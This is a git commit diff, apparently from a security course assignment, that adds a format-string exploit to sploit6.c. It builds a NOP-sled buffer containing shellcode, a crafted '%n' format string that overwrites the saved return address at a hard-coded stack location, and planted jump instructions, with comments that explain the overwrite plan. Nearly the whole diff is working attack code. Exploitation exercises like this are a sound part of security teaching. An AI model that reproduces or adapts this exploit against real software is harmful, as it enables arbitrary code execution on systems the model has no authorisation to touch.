2a6520ffe35daed6fcc8148d4ca2e9ff91a1b6d2
user <user@box.(none)>
2013-08-02 02:55:40 -0700

    Sploit 6!

--- sploits/sploit6.c
+++ sploits/sploit6.c
@@ -12,15 +12,24 @@ int main(void)
   char *env[1];
   char *format;
 
+  // this one is pretty hard. eip's value is 08048471 at address bffffd8c
+  // it's impossible to overwrite the value to buf's address,
+  // since buf's address is 0xbffffc88, ~3 billion in decimal, out of int range
+  // Try to change the value to 0xbffffd71 (change only first 3 bytes)
+  // And put a jump back to 0xbffffc8c (shellcode's address) at 0xbffffd71
+
+
   args[0] = TARGET; 
   args[1] = malloc(256);
   memset(args[1], 0x90, 255);
   *(unsigned int *)(args[1]+255) = 0x00;
 
-  *(unsigned int *)(args[1]) = 0xaaaaaaaa;
+  *(unsigned int *)(args[1]) = 0xbffffd8d;
+  format = "%u%u%012582651u%n";
   memcpy(args[1]+4, shellcode, strlen(shellcode));
-  format = "%08x%n";
-  memcpy(args[1]+4+strlen(shellcode), format, strlen(format));
+  *(unsigned int *)(args[1]+107) = 0x909097eb;
+  *(unsigned int *)(args[1]+233) = 0x909080eb;
+  memcpy(args[1]+255-strlen(format), format, strlen(format));
 
   args[2] = NULL;
 
